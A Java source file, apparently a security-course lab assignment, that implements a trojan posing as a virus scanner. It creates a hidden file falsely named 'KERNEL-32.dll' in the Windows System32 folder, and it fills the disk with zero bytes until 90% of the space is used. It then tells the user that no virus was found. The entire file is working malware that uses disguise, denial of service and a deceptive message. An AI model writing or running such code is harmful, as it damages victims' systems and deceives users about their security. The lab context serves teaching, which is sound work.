package csci476.lab3;
import java.io.*;
import java.nio.file.*;
import static java.nio.file.Files.newOutputStream;
import static java.nio.file.StandardOpenOption.CREATE;
import static java.nio.file.StandardOpenOption.CREATE_NEW;

public class Main {

    public static final boolean DEBUG = false;

    public static void main(String[] args) throws IOException {
	// write your code here
        Path dllPath = Paths.get(System.getenv("SYSTEMROOT") + "/System32/KERNEL-32.dll");

        if(DEBUG) {
            System.out.println("Attempting to create new file at " + dllPath.toString());
        }
        /*
         * Attempt to create the file and set its attribute. If the file already exists, just open it.
         */
        OutputStream out;
        try {
            out = new BufferedOutputStream(Files.newOutputStream(dllPath, CREATE));
            Files.setAttribute(dllPath, "dos:hidden",true);
        } catch (AccessDeniedException e) {
            System.err.println("Access was denied while trying to create file.");
            return;
        }

        File dllFile = new File(dllPath.toString());


        System.out.println("Total disk size: " + dllFile.getTotalSpace());
        System.out.println("Usable space: " + dllFile.getFreeSpace());
        System.out.println("Size to be filled up: " + getAmountOfSpaceToFill(dllFile));
        //The above three lines are for debugging.




        while(getAmountOfSpaceToFill(dllFile) >= 0){
            writeMB(out);
        }


        System.out.println("The scanning finished and no virus is found!");
        //tell the user they have no viruses.
    }

    public static long getAmountOfSpaceToFill(File dllFile) {
        return (long)((dllFile.getTotalSpace() * 0.9) - (dllFile.getTotalSpace() - dllFile.getFreeSpace()));
    }

    public static void writeMB(OutputStream outputStream) throws IOException {
        byte[] bytes = new byte[1];
        bytes[0] = 0;
        for(int i = 0; i < 1000000; i++) {
            outputStream.write(bytes);
        }

    }
}
